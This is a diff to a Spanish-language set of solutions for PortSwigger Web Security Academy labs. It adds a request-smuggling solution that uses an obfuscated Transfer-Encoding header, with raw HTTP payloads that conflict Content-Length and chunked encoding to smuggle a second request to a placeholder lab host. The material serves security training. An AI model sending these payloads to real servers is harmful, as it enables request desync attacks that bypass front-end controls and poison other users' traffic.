@@ -440,7 +440,7 @@ javascript:alert("1337")
 
 #### Solución:
 
-Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp Repeater):
+Enviar 2 veces la siguiente request:
 
 ```
 POST / HTTP/1.1
@@ -457,13 +457,37 @@ G
 
 #### Solución:
 
-Enviar la siguiente request (desactivar "Update Content-Length" de Burp Repeater y mantener los 2 saltos de línea del final):
+Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp Repeater y mantener los 2 saltos de línea del final):
 
 ```
 POST / HTTP/1.1
 Host: LABID.web-security-academy.net
 Content-Length: 4
 Transfer-Encoding: chunked
+
+82
+GPOST / HTTP/1.1
+Host: LABID.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+
+0
+
+
+```
+
+### [HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header)
+
+#### Solución:
+
+Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp Repeater y mantener los 2 saltos de línea del final):
+
+```
+POST / HTTP/1.1
+Host: LABID.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: x
 
 82
 GPOST / HTTP/1.1
